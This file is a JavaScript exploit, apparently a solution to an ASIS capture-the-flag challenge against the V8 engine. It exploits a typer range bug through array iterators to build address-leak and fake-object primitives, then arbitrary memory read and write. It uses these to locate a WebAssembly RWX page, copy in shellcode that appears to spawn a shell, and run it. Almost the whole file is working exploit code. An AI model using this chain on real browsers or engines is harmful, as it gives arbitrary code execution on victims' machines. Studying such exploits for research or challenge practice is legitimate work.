// ASIS{17863cdc79d5436127bf5d7c5b5cb141}
// @IceCreamMan
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);
let addr_arr2;
function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function dp(obj){
	return;
	//%DebugPrint(obj);
}

function leakMap(b){
	let a = "aaaaa";

	//actual = -1
	let result = a.indexOf(b);	

	//actual = -1, typer = [4, 536870888]
	result = Math.max(result, 536870887);
	
	//actual = -1, typer = [0, 1023]
	result >>= 0x13;
	
	result += 2;

	//actual = 1, typer think its 0
	let arr = Array(result);
	arr[0] = 1.1;
	let cor = [1.1, 1.2]

	//iterator typer think he creates a very big array
	//but actual array created only have size of 1
	let itx = arr.values();
	itx.next();
	itx.next();
	itx.next();
	let leak = itx.next().value;
	let leak2 = itx.next().value;
	return [arr, cor, leak, leak2];
}

function addrof(b, obj){
	let a = "aaaaa";

	//actual = -1
	let result = a.indexOf(b);	

	//actual = -1, typer = [4, 536870888]
	result = Math.max(result, 536870887);
	
	//actual = -1, typer = [0, 1023]
	result >>= 0x13;
	
	result += 2;

	//actual = 1, typer think its 0
	let arr = Array(result);
	arr[0] = 1.1;
	let cor = [1.1, obj]

	//iterator typer think he creates a very big array
	//but actual array created only have size of 1
	let itx = arr.values();
	itx.next();
	itx.next();
	let leak = itx.next().value;
	let leak2 = itx.next().value;
	return [arr, cor, leak, leak2];
}


var obj = {};

for (var i = 0; i < 0x3000; i++){
	leakMap("b");
}


for (var i = 0; i < 0x3000; i++){
	addrof("b", obj);
}


let a = leakMap("b");
let leakCor = a[1];
let float_array_map = ftoi(a[3]);
argumentFakeObj = itof(float_array_map);

console.log("float_array_map = 0x" +(float_array_map).toString(16));

function fakeObj(b, addr){
	let a = "aaaaa";
	let d = addr;
	//actual = -1
	let result = a.indexOf(b);	

	//actual = -1, typer = [4, 536870888]
	result = Math.max(result, 536870887);
	
	//actual = -1, typer = [0, 1023]
	result >>= 0x13;
	
	result += 2;

	//actual = 1, typer think its 0
	let arr = Array(result);

	let cor = [1.1, 1.2, 1.3];
	cor[0] = addr;

	let itx = arr.values();
	itx.next();
	itx.next();
	itx.next();
	itx.next();
	itx.next();
	itx.next();
	itx.next();

	let leak = itx.next().value;
	let leak1 = itx.next().value;	
	let leak2 = itx.next().value;	
	let leak3 = itx.next().value;		
	//if (flag){
	//	dp(itx);
	//}

	return [arr, itx, cor, leak, leak1, leak2, leak3];
}

function addrofReal(obj){
	let b = addrof("b", obj);
	addr = ftoi(b[2]) & 0xffffffff00000000n;
	addr >>= 32n; 
	return addr;
}

let arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
addr_arr2 = addrofReal(arr2);
console.log("address of arr2 = 0x" +(addr_arr2).toString(16));


fakeObj("b", 1.1);
for (var i = 0; i < 0x5000; i++){
	fakeObj("b", 1.1);
}

//let fake = fakeobj(addrof(arr2)+0x20n);
let arr3 = [itof(float_array_map), 1.2, 2.3, 3.4];
addr_arr3 = addrofReal(arr3);
console.log("[+] address of arr2 = 0x" +(addr_arr3).toString(16));
console.log("[+ itof(float_array_map) = ", itof(float_array_map));

let c = fakeObj("b", itof(addr_arr3 + 0x20n));
let arr = c[0];
let itx = c[1];
let cor = c[2];
let fake = c[3];
dp(arr);

function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr3[1] = itof((2n << 32n) + addr - 8n);
    return (fake[0]);
}

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    arr3[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

function copy_shellcode(addr, shellcode) {
    let dataview = new DataView(buf2);
    let buf_addr = addrofReal(buf2);
    dp(buf2);
    let backing_store_addr = buf_addr + 0x18n + 3n;
    arbwrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
      dataview.setUint8(i, shellcode[i], true);
    }
}

var rwx_page_addr = ftoi(arbread(addrofReal(wasm_instance) + 0x60n));
print("[+] Address of rwx page: " + rwx_page_addr.toString(16));

var shellcode = [0x90, 0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7, 0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, 0x3B, 0x0F, 0x05];
copy_shellcode(rwx_page_addr, shellcode);
f();

ASIS-CTF